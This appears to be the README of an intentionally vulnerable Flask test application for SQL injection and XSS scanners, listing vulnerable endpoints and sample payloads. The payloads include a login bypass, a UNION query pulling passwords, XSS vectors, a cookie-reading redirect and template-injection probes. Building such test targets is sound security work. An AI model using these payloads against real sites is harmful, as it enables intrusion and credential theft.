# Vulnerable Test Application

This is a simple Flask application with intentionally vulnerable endpoints for testing SQL injection scanners.

## Setup

1. Create a virtual environment:
```bash
python -m venv venv
```

2. Activate the virtual environment:
- Windows:
```bash
venv\Scripts\activate
```
- Linux/Mac:
```bash
source venv/bin/activate
```

3. Install dependencies:
```bash
pip install -r requirements.txt
```

4. Run the application:
```bash
python app.py
```

The application will be available at http://localhost:5000

## Vulnerable Endpoints

### SQL Injection Vulnerabilities:

1. Login Form (POST /login)
   - Parameters: username, password
   - Vulnerable to SQL injection

2. Search Users (GET /search)
   - Parameter: query
   - Vulnerable to SQL injection

3. User Profile (GET /profile)
   - Parameter: id
   - Vulnerable to SQL injection

4. Register (POST /register)
   - Parameters: username, password, email
   - Vulnerable to SQL injection

### Cross-Site Scripting (XSS) Vulnerabilities:

1. Profile Page (GET /profile)
   - Parameter: id
   - Reflected XSS vulnerability - user input reflected in response

2. Search Page (GET /search)
   - Parameter: query
   - Reflected XSS vulnerability - search term reflected in results

3. Echo Chamber (GET/POST /echo)
   - Parameter: text
   - Multiple XSS vulnerabilities in different contexts:
     - HTML context
     - JavaScript context
     - HTML attribute context

4. XSS Test Page (GET /reflected-xss)
   - Parameters: param1, param2, param3
   - Dedicated test endpoint with various XSS vectors

5. DOM-based XSS (GET /dom-xss)
   - Parameter: name
   - Client-side DOM manipulation vulnerability

6. Advanced XSS (GET /advanced-xss)
   - Parameters: input, context
   - Context-specific XSS vulnerabilities:
     - HTML context
     - JavaScript context (including JSON)
     - Attribute context
     - CSS context
     - URL context
   - Test different contexts by selecting from dropdown

7. Template Injection (GET /template-injection)
   - Parameters: name, template
   - Server-side template injection vulnerability
   - Allows arbitrary code execution through template syntax

8. Chained XSS (GET /chained-xss)
   - Parameters: id, action, redirect, token
   - Multiple vulnerable parameters that can be chained
   - JavaScript execution in different contexts
   - Vulnerable redirection logic

## Test Cases

Here are some SQL injection payloads you can test:

1. Login bypass:
```
username: admin' OR '1'='1
password: anything
```

2. Search injection:
```
query: ' UNION SELECT id, username, password FROM users--
```

3. Profile injection:
```
id: 1 OR 1=1
```

4. Register injection:
```
username: test' OR '1'='1
password: test' OR '1'='1
``` 

Here are some XSS payloads to test:

1. Basic XSS:
```
<script>alert(1)</script>
```

2. HTML context bypass:
```
<img src=x onerror=alert(1)>
```

3. JavaScript context:
```
";alert(1);//
```

4. Attribute context:
```
" onmouseover="alert(1)
```

5. Advanced contexts (for /advanced-xss):
```
JavaScript: "-alert(1)-"
CSS: expression(alert(1))
URL: javascript:alert(1)
```

6. Template injection (for /template-injection):
```
{{config}}
{{7*7}}
{{self.__class__.__mro__[1].__subclasses__()}}
```

7. Chained attack (for /chained-xss):
```
redirect=javascript:alert(document.cookie)
```